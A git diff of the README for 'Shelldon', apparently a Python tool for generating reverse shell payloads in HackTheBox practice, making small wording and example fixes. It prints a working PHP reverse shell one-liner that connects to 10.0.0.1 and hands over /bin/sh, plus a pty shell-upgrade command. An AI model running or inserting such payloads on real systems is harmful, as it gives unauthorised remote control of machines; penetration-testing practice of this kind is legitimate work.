@@ -1,5 +1,5 @@
 # Shelldon
-Shelldon is a simple python tool for creating a customizable reverse shell payload with very little effort
+Shelldon is a simple python tool for creating a customizable reverse shell payload with very little effort.
 
 This is a tool I developed while working on HackTheBox machines for convenience. Instead of having to refer to http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet every five minutes, I created this program.
 
@@ -114,7 +114,7 @@ export TERM=screen-256color;python3 -c 'import pty;pty.spawn("/bin/bash")';
 
 ## PHP
 ```
-root@kali:/opt/shelldon# shelldon python -a
+root@kali:/opt/shelldon# shelldon php
 php -r '$sock=fsockopen("10.0.0.1",53);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
 - **Default COMMAND: php**
